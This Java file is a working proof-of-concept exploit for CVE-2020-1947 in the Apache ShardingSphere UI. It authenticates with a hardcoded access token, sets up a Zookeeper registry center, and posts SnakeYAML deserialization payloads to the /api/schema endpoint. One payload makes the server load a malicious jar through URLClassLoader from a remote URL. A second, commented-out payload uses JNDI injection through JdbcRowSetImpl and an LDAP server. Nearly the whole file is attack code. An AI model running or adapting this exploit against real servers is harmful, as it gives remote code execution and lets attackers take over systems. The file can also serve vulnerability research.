package com.threedr3am.bug.shardingsphere.ui;

import com.threedr3am.bug.common.server.LdapServer;
import java.io.UnsupportedEncodingException;
import java.util.Random;
import java.util.concurrent.Executors;
import org.apache.http.HttpEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;


/**
 * @author threedr3am
 */
public class Poc {

  public static void main(String[] args) throws UnsupportedEncodingException, InterruptedException {
    String target = "http://localhost:8088";
    String accessToken = "eyJHWlhhU1BtZSI6InJBbENVIiwicGFzc3dvcmQiOiJJRXRtbiIsImFJU1o0NiI6eyJtQnZPTHp0QmpiayI6WzU0LDM1LDUzLDU2LDgxLDY0LDk1LDE5LDIzLDk0LDEzLDgzLDk3LDg4LDM0LDc2LDU2LDY4LDU3LDg2LDc5LDQxLDMxLDc5LDE2LDE0LDIzLDIxLDk5LDI2Myw5OTEsNjYyLDgyNiw3MTUsOTc5LDk2Nyw0NDksNTIyLDgyNSw5OTMsNzI2LDYyOSw3NDksMzg4LDY1Miw2MzksOTYzLDUzMiwxODIsNzkxLDU1NywxNzEsODYsNjIsNzUsMjksOTIsMzQsNDEsMzYsODUsMjgsMzUsMzJdLCJvUGFZZ2VzWm1VYSI6Wy02LC0zLC03LC0zLC0yLC03LC0zLC01LC01LC02LC03LC05LC0yLC0zLC00LC05LC02LC02LC0zLC00LC02LC02LC0zLC04LC04LC02LC03LC0yLC02LC04LC02LC01LC01LC0yLC0zLC04LC0xLC0yLC02LC0xLC0yLC0xLC04LDc2LC01LDY3LC04LDEyLDY0LDc0LDkyLDc0LDU1LDExLDE0LDYzLDg3LDgzLC03LC00LC04LC0xLC0zLC05LC0xLDIsNCw0LDMsMiw5LDYsMywxLDUsOTksODIsMzMsNTUsNDYsMjEsMjcsOTgsNDUsMzYsNzYsMTQsNDcsODUsNzQsMTgsLTgsLTQsLTIsLTgsODYsLTYsMzcsNTQsNTcsODQsMzksMTksODEsMTYsMzYsNTcsNDgsMzEsNjIsNzQsMzEsNjksNTcsOTUsODYsNDksNDYsMjIsOTcsNjYsMzIsMzhdLCJxRWNUZFd4b2p5IjozLCJDSldKelpGVnJJIjo4LCJPbGEiOjEyLCJZZGgiOjQzLCJ6UWVSeVBDRFJ0V1NMeExScVciOjQsIkNQYmlJaWhRUlBHZk1xS2QiOjksImdGdkpZR29UTUUiOjcsInZSRmFhUWtmeU5JVGt2bmpVUVVaIjo2fSwiZGJ2aSI6eyJJd1FNcCI6eyJjT0RZR0VsTGVWelhZVGZacWhQIjo2NTk0OTkyNzI0fSwiWERYS1Jmd0R3eFhNYWEiOnsiQ2p3LnlrVnRmbS5Wb1BsLlhidU5kcU5xLmRlVGsuSEhETGZRaXNma3dBTkhXJDYiOnt9LCJvSW4uSHVBd1JKLnlFRVkuTE1xS1VqbGNpTWtMRHlvaXlyaWF2S0ciOnt9LCJDU2EualJQSklnLnVPQlEuclJRTVRTUVcuS1VDSC5vdGRNdGlKVVN3aFAkOTciOnt9LCJkalJsalIiOnt9LCJScE0ueEp0VkZKLkRZTUoudWJCeER6eVNkbmtBTk5GXGMxMzFBP1xlMjg0UCI6e30sInVVcFNWWHgiOnt9LCJIZ1QucEhYdmpDLlZnS1guRFdyd1lKVFEuUlZNSW5Lc3BPeGVISmJ5UVViWkpwWCI6e30sIldrVnouZE5rbi5MeVZMcHVkLlhaSW8iOnt9LCJpbHguellUZGl3LndQSWIuT0tCY0N2cGUuVE1Oei56UXRyemdrTkZSYk50a3J0UVpkZ2EiOnt9LCJKV2YiOnt9LCJkbmhtLmRlQlIuemtmQ2p6ZyI6e30sImtscS5IQlJ3ekguSW9NeC5aWVVYaWRQSS5XaEZTLlB6VGd3YUNFV3JiZFRWZnVhQyQyIjp7fSwiQlF0LlN6WG1JcS5yWFRoRmhoLmNiSlBDLklUZFBYSS5BYmJKMjkiOnt9LCJ5b29YLm9OdFEuSFN3VHFrU0dtWWNcVTI2MmNsSkVyLkl6TXouSEdYXG85ODVjRGJWLllmemtZYi56UmlELkNMeWtDWWwuQlhYdURzWldnXEs2MzhNP1xPOTczZywgV1FZLnNlZnVZSS5OUHJ6LnJ4RW8kUWJ2ZnJmTGtpekR2WUd4Vk1caDE1OFk_XFo1MjdqXEQ3MjVSXFE0NDJ5Ijp7fSwiTGh0ai56bHBlLktVRlx6MTMxaEZLZVIua1JVbi5XYWJ0Rk5wLlZ5ZEosIHVxQy5Sd1R4VE8uTkRHci5hRUdnS1hUa2hNWE1uRmlcQjUzMlM_XGkzOThUXFEyMjNEIjp7fSwiR09NLkZQYmNybi55dGxCLnJNR0hWclZiLmdSSHAudG5MT3NJZHJuQU9icFd1UiQ2Ijp7fSwiUGdPUi5aUXFILlZRUEJCXGYzNTNhP1x4NDU0UiI6e30sIlJ5bS5zaGlhY2suZmVRVi5JZHJRQ2V3Vi5qanl2LlRRQXRoYlJQZ0dQRWxXc0hvJDQiOnt9LCJ0eERyLmp5bmoudkRuZ1xhNjY3dFVOdy5rWkZTSkwuS0ZCRS5qSE1LV01xd1l0TVB0SmZ6aWVcbTE4NkQiOnt9LCJib3kueHVkSHJoLmpMU1EuY2hWU3FQZXEuUlRrSi5TWENneE50S0lrRVQkNTgiOnt9LCJURXIuemJOWWtVLnNkVkUuWnBsUE1JSUEuTFByTC5FZENmdHlxR0ZPVEEkODgiOnt9LCJjamIud3hoV0ZnLlV5d1guTVNNSFhZbHouUVBaVC5BeXRSQlhxeUNiQkdKVmdJSWZWcm5lZUNwd2JEIjp7fSwiYUpjLlRMZUpvby5MSnhDLkdNaFFWQlJnLnJJdUsuWHpLYmNscFJacnRPJDI2Ijp7fSwiV0tzLkxJeEhqbS5Vd0NhLnl4dnFqcVN4bUFIbGlVYUJtS1VSYk1WJDUiOnt9LCJMVHVXLlpRWEMuQm9NWSI6e30sImJMcC5EaWhwTncuQWVORy5NWEVsUUpKUVdRb1lQVXVaZW1ZIjp7fSwiTXpPWC5aaXhLLkFIa0hDVCI6e30sIldmRi5qdXBMUUUuR2FiYi5xdElrTmtXLklQbVpxWHpRR1xkNTMxVT9cczY3MWoiOnt9LCJNZ2YuSnRLV2RlLnVkemMuR01peVdOaEguQnJoSS5tR3dmS1JsUmJyUkUkMTQiOnt9LCJUd3IudGtoa2dzLm1FZEFTdFVkTG1mQkRYLmppLkR5U2xhYnh2LlFMSnJrWFpIa1B3VHlZRUxuZU5ha21DRkciOnt9LCJQS3kucWpTRHJjLkVEU3YuZUJsR2R1T2xTaXRDY1dRS1VMIjp7fSwiU2Racy5lWGNrLnVQbERcRjk4OENTQXkuTHVaRHNGLkNWd2guZVdVeGJvZ0duaklLVnNORHhcSDYxOEoiOnt9LCJVbXIuR1RaVmV6LkhGaXcuQXZXZ3ZPa1dIc1FcQzExN0E_XGo1MjlXIjp7fSwiYVhZLk1GQnNDeC5PY3JrLlZoZXZKZnJCLkdFclouakZ3dnNoRkpmVUdrZ1JBS3NBSENUQXdCU1JteXBla3lMRVdwWktPIjp7fSwiZ1dhLnpoZ2djZy5aQ0FqLlBkbU5MeGZxLlRSeUcuclpmanV2TEdVaGlXUnVEJDEiOnt9LCJGQ0wuT3BWZUdvLnFMbksuQUhiQmdCRlQub1NCei5CQkNPWHRVd3VXeU4kNzEiOnt9LCJhVUNBIjp7fSwiWXJzY1tdIjp7fSwidWljLlpnZVJheC5pa3ZBLm5KeE5YUHNPLktKV3hQTlMubWRkQURHUW9NdVpLYmJEaXZlIjp7fSwidmF0LnhqTVRhUS5UVXBOLlJhd1pJaEF4Lm1KTVEuUWRJR1NJREllRktBYnl1bFRVbENWckpGZlVYSCI6e30sIml4SkUuVlNHdi5MZ1VvY1YiOnt9LCJQbW8uS0hYV3Z2LnR5RkouZEJVZU1KVEVOb3ZqQ3lsU2QkMiI6e30sImRtby56QXNzQ28uZFhGbS5aQ0FyIjp7fSwidGphLk5PbW13Ry5DRXFyLkFTalNmU2N3LlNyTU1GUWcuSElrSnZWSTlQc0NHSE1MQVJEZWhuRkpsVWMiOnt9LCJhQVB5LkV1a2wuZ1lwXEc1MTRSeVhELnlVc0lxdy5jTHViLllranlWSGYueElQdUdKUFRiXHkxMjJiP1xDNjYzdywgdG1ZLmN5THRtSS5xY3NlLmltYWlDYkRCak11XGIxNDlUP1xvMjk2UFx2NDE3SSI6e30sIkhKVkcudURJZy5zbHJEb2x4Ijp7fSwiUXBlLk9QT2RIaC5SWUNyLlZLdm5hRm56Z3lQZ2hBY1pqIjp7fSwiUHVkLmJpdFBETy5Md1Z4Lk1FbUJPaFRKLmFJcXZGRmN3Ijp7fX0sIkhYYUNHcktMQ0pvT1hpTEd6U1dUd04iOnsiY2RBV3BtbWlmYXJRQXlCSyI6e30sInNxdGdxUXpKIjp7fX0sIk5JaUNsQmxpUGFkaHJNVGJ5QyI6eyJzSlZNaHBxcVVXSXNaZXlnbGZGZ1RQIjp7Im5ReHNhdEh5UEhSU0FlSFIiOnt9LCJucXJCWnlWVCI6e319fSwiWW1iQ3BIaEZaIjpbbnVsbCxudWxsLHsiWk5tREZKeiI6LTUuNiwid051cERNTGJUIjo4ODIsIk5xZWdsZVRnRkNpb25xZk5Id0libCI6dHJ1ZSwiSHlZcG9Lam9SSnpCTCI6ZmFsc2UsImNLYlFxQmlCdGRMWmJEY0R3WHpjb1ZCIjpbXSwiTUhZR3JhSndPaWZRRlhvc1lwUUxIVERCcyI6W119LG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLHsiTWRDRHZLTEZidmxKQ0xHYVVtSmhERCI6eyJYY2hkb2xkdUhwWnBSYk1rIjp7fSwiQ3VQeUxUVmEiOnt9fX0seyJpVmx0eVpTcUNtSVNVSWhTckV4eE1wIjp7IkdMV3RjdWtNYWFDbmFoUEYiOnt9LCJxSk11a0t3byI6e319LCJhaHBubVZUdG1sUG9rbkdwR0ZZU05FYUVvcCI6ZmFsc2V9LHsiYWlLSmNLU0l1RXFaUktIeGRvWENZTyI6eyJHbXZOZWl1UGhFTkpxcXlBIjp7fSwielZLanVFRWkiOnt9fX0sbnVsbCx7IndQcU5mSGxXa0N4aFp5dmNXVVNOaUciOnsiT3dXcUpZak9mTFJYU1hmayI6e30sImhxVFhDQlZCIjp7fX0sIm1QVXhublFjTGRLUnBBS0plIjoielBDcmpLdkciLCJ3VUdhSER1RyI6eyJJSkNud3NsIjotNy41LCJRVkhSeldsUU0iOjQzMywiSnVpQ2xSem9Yb2lWd216WUJ6WVpCIjp0cnVlLCJyUVhVTHhpU1p0c1FNIjpmYWxzZSwiZWh3cWdnaXh0REh5enFObVRrRUp5Y2siOltdLCJTV29ETVFYYXJnZGNUSVdwemdNUGNwVXBQIjpbXX0sImpHTEp4Y3pCdXJsb0ZrVEVKaCI6eyJjU2VPdHd3aFdzdXp0ZXlFUGJyWFJTIjp7ImxIQWZnV3NIQkROc05hbmsiOnt9LCJGcWJIbmVpVyI6e319fSwiRlZ3RU9jdHYiOnt9fV0sIk1UTUNWUVRCIjp7ImVxR2NiY3IiOi0yLjgsIkV6d1ZER2FjbCI6MjI0LCJPbnV3aENycGZnVUtBUEpCTmdickoiOnRydWUsImFRVGV1WGVSbVNLSVQiOmZhbHNlLCJWVERqZVh1S09uTVRLV2RBVk9SVWdsaSI6W10sImdUQWRZTHVLZ2hHU0Z2ZmZEbERIQ2ZkV2giOltdfSwielJmbnphdVhTeXBHcXZzR2JzbyI6InlaelhMZE5tIiwiRmFoakRiVU5wUm1hcEliWiI6e30sIk5Td0l4aWRBVG5rcVRxIjpmYWxzZSwiTXZIVlpJT1dvTnJvREZnVW5taFRmSkRrSFgiOmZhbHNlLCJGUnlnc1VtblpycGZrVWVYbGhhdFJjaWZSIjpmYWxzZSwiWU5zeGZEdWsiOnRydWUsImJmWlNoYmRDQ3ZoWHhIIjpmYWxzZSwiZUNuaXVQYyI6ZmFsc2UsInJkbW1BbnhuT1hlWmRxYVdCTEliUlBycEhucEN2SmRQbEdmIjpmYWxzZSwiR0VMVUhxWGtrIjozLCJSa2tjTHl3R2IiOjksIk9pZ25kSmtNTFZ5a3JIenhxaXhSbW1UIjoiTndTa3R1QSIsImZkTFNyaVhtZFpXWlNWd3oiOltdLCJneVBGY1RCSEFGSXlvdkd0SWVXc01lS3RWIjpbXX19";
    String zookeeperURL = "127.0.0.1:2181";

    initData(target, accessToken, zookeeperURL);

    //todo payload-1：恶意jar包 payload，参考 common这个module 的CalcScriptEngineFactory类，以及其SPI注册文件META-INF/services/javax.script.ScriptEngineFactory
    String evilJar = "http://127.0.0.1:80/common-1.0-SNAPSHOT.jar";
    attack(target, accessToken, evilJar);

    //todo payload-2：使用jndi注入 payload
    String evilLdapServer = "ldap://127.0.0.1:43658/Calc";
//    Executors.newSingleThreadExecutor().execute(() -> LdapServer.run());
//    Thread.sleep(3000L);
//    attack2(target, accessToken, evilLdapServer);
  }

  private static void attack(String target, String accessToken, String evilJar)
      throws UnsupportedEncodingException {
    String payload;
    HttpPost httpPost;
    HttpEntity httpEntity;

    //todo 添加scheme，反序列化RCE
    payload = "'111': !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['" + evilJar + "']]]]";
    payload = "{\"name\":\"CVE-2020-1947(" + new Random().nextInt(10000) + ")\",\"ruleConfiguration\":\"name: 111\\nmasterDataSourceName: 222\\nloadBalanceAlgorithmType: 333\\nslaveDataSourceNames: [111,222]\",\"dataSourceConfiguration\":\"" + payload + "\"}";
    httpPost = new HttpPost(target + "/api/schema");
    httpPost.addHeader("Access-Token", accessToken);
    httpEntity = new StringEntity(payload, "application/json", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableCookieManagement()
          .disableAuthCaching()
          .disableRedirectHandling()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  private static void attack2(String target, String accessToken, String evilLdapServer)
      throws UnsupportedEncodingException {
    String payload;
    HttpPost httpPost;
    HttpEntity httpEntity;

    //todo 添加scheme，反序列化RCE
    payload = "!!com.sun.rowset.JdbcRowSetImpl\\n   dataSourceName: " + evilLdapServer + "\\n   autoCommit: true";
    payload = "{\"name\":\"CVE-2020-1947(" + new Random().nextInt(10000) + ")\",\"ruleConfiguration\":\"name: 111\\nmasterDataSourceName: 222\\nloadBalanceAlgorithmType: 333\\nslaveDataSourceNames: [111,222]\",\"dataSourceConfiguration\":\"" + payload + "\"}";
    httpPost = new HttpPost(target + "/api/schema");
    httpPost.addHeader("Access-Token", accessToken);
    httpEntity = new StringEntity(payload, "application/json", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableCookieManagement()
          .disableAuthCaching()
          .disableRedirectHandling()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  private static void initData(String target, String accessToken, String zookeeperURL)
      throws UnsupportedEncodingException, InterruptedException {
    String name = String.valueOf(new Random().nextInt(10000));
    //todo 创建注册中心
    String payload = "{\"digest\":\"\",\"name\":\"CVE-2020-1947(" + name + ")\",\"namespace\":\"threedr3am\",\"orchestrationName\":\"threedr3am\",\"registryCenterType\":\"Zookeeper\",\"serverLists\":\"" + zookeeperURL + "\"}";
    HttpPost httpPost = new HttpPost(target + "/api/reg-center");
    httpPost.addHeader("Access-Token", accessToken);
    HttpEntity httpEntity = new StringEntity(payload, "application/json", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableAuthCaching()
          .disableCookieManagement()
          .disableRedirectHandling()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }

    //todo 连接注册中心
    payload = "{\"name\":\"CVE-2020-1947(" + name + ")\"}";
    httpPost = new HttpPost(target + "/api/reg-center/connect");
    httpPost.addHeader("Access-Token", accessToken);
    httpEntity = new StringEntity(payload, "application/json", "utf-8");
    httpPost.setEntity(httpEntity);
    try {
      HttpClientBuilder httpClientBuilder = HttpClients
          .custom()
          .disableAuthCaching()
          .disableCookieManagement()
          .disableRedirectHandling()
          ;
      CloseableHttpClient httpClient = null;
      CloseableHttpResponse response = null;
      try {
        httpClient = httpClientBuilder.build();
        response = httpClient.execute(httpPost);
      } finally {
        response.close();
        httpClient.close();
      }
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
